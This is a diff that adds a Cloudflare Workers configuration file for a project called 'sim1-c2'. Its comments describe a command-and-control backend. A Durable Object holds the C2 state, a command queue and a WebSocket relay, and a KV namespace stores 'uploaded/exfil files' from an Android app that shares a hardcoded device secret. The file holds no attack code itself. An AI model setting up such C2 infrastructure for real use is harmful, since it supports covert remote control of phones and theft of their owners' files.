@@ -1,0 +1,33 @@
+name = "sim1-c2"
+main = "src/index.js"
+compatibility_date = "2025-01-01"
+workers_dev = true
+preview_urls = false
+
+# Admin panel + config served as static assets.
+[assets]
+directory = "./public"
+binding = "ASSETS"
+run_worker_first = true
+
+# All live C2 state, the command queue and the WebSocket relay live in one
+# Durable Object instance ("global"), so it survives across requests and scales
+# to a single always-warm instance. Free plan supports SQLite-backed DOs.
+[[durable_objects.bindings]]
+name = "C2"
+class_name = "C2"
+
+[[migrations]]
+tag = "v1"
+new_sqlite_classes = ["C2"]
+
+# Uploaded/exfil files are stored here (KV, free tier, no card).
+# Replace REPLACE_WITH_KV_ID after:  wrangler kv namespace create FILES
+[[kv_namespaces]]
+binding = "FILES"
+id = "74194b07dc3d45d8b9ca3a364c5e5ded"
+
+[vars]
+# Must match the Android app's Config.DEVICE_SECRET.
+C2_DEVICE_SECRET = "sim1-shared-secret-change-me"
+C2_ADMIN = "admin"
